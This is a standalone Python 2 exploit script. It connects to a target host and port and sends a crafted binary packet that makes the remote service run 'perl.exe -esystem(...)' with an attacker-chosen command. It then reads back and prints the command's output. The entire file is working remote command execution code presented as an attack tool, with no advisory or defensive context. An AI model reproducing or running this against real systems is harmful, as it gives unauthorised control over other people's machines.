import socket
import struct
import sys
 
def usage():
    print >> sys.stderr, "Usage: %s <target> <port> <command>" % sys.argv[0]
    exit(-1)
 
def exploit(host, port, command):
    # Try to connect
    print >> sys.stderr, "[*] Connecting to target '%s:%s'..." % (host, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, int(port)))
    except Exception as ex:
        print >> sys.stderr, "[!] Socket error: \n\t%s" % ex
        exit(-3)
    else:
        print >> sys.stderr, "[*] Connected to the target."
     
    # Connected, build the malicious payload
    OFFSET = 46
    command = command.replace("\\", "\\\\")
    command_size = chr(OFFSET + len(command))
    CRAFTED_PKT = "\x00\x00\x00" + \
                  command_size   + \
                  "\x32\x00\x01" + \
                  "\x01\x01\x01" + \
                  "\x01\x01\x00" + \
                  "\x01\x00\x01" + \
                  "\x00\x01\x00" + \
                  "\x01\x01\x00" + \
                  "\x2028\x00"   + \
                  "\\perl.exe"   + \
                  "\x00 -esystem('%s')\x00" % command
     
    # Send payload to target
    print >> sys.stderr, "[*] Sending payload '%s'" % command
    sock.sendall(CRAFTED_PKT)
     
    # Parse the response back
    print >> sys.stderr, "[*] Output:"
    while True:
        # Get information about response
        response_size = sock.recv(4)
        if not response_size: break
        n = struct.unpack(">I", response_size)[0]
 
        # Get command results
        # code  = response[:5]
        # data  = response[5:]
        response = sock.recv(n)
 
        # Clean and parse results
        response = response[5:].strip()
        response = response.replace("\n", "")
        response = response.replace("\x00", "")
        # Check for the end-of-message
        if response.upper().find("*RETVAL*") != -1:
            break
        print response
 
    # Close connection
    sock.close()
 
if __name__ == "__main__":
    # Get command-line
    argc = len(sys.argv)
    if argc < 4:
        usage()
    host = sys.argv[1]
    port = sys.argv[2]
    cmd  = sys.argv[3]
    if port.isdigit():
        port = int(port)
    else:
        print >> sys.stderr, "[!] Error, invalid port value"
        exit(-2)
 
    # Send malicious payload
    exploit(host, port, cmd)
    exit(0)
